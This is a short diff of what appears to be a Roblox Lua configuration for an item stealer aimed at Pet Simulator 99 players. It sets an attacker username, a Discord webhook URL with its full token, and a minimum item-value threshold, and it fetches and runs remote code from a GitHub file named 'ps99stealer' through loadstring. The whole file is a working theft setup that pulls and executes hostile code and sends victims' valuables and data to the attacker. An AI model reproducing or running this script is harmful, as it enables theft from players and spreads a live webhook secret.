@@ -1,6 +1,6 @@
-Nombre de usuario= 'duditoq3'
+Username= 'duditoq3'
 Webhook= 'https://discord.com/api/webhooks/1283230603285626952/2Jb3GlifuiB-xCULKGajQLzOg023m2rjuxrFhnJaEsWJJQhR1L7tlVtHxpIGY09Gt-_8'
  
-RAP mínimo = 15000
+MinimumRAP = 500000
  
 loadstring(juego:HttpGet("https://raw.githubusercontent.com/IanWP411/Putinkamailstealer/main/ps99stealer",true))()
